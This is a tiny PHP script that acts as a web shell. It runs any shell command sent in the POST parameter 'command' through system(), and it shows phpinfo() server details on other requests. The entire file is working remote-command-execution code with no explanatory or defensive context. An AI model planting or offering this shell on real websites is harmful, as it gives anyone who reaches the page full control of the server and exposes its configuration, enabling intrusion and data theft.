<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      system($_POST['command']);
  } else {
      phpinfo();
  }
